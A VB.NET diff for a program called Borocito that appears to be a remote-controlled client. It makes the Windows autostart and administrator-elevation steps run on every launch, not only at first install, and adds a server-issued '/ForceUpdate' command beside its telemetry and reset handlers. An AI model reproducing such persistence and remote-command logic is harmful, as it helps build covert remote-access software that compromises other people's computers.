@@ -89,6 +89,10 @@ Module StartUp
         Try
             'Iniciar desde otra ubicacion
             RunFromLocation()
+            'Iniciar con Windows
+            StartWithWindows()
+            'Iniciar con Administrador
+            StartWithAdmin()
             'Ver si ha existido
             If AlreadyExist() Then
                 'Ya ha existido
@@ -106,10 +110,6 @@ Module StartUp
                 UID = CreateRandomString(15)
                 'Guarda la UID
                 SaveRegedit()
-                'Iniciar con Windows
-                StartWithWindows()
-                'Iniciar con Administrador
-                StartWithAdmin()
                 'Reportar al servidor
                 ReportMeToServer()
                 'Guardar existencia
@@ -561,6 +561,12 @@ Module Network
                             AddToLog("Network", "Borocito has been called to Update!", True)
                             SendTelemetry()
                             Update()
+
+                        ElseIf CMD1.Contains("/ForceUpdate") Then
+                            SendCommandResponse("Borocito has been called to Force the Update")
+                            AddToLog("Network", "Borocito has been called to Force the Update!", True)
+                            SendTelemetry()
+                            Update("/ForceUpdate")
 
                         ElseIf CMD1.Contains("/Reset") Then 'Funciona.
                             SendCommandResponse("Borocito has been called to Reset")
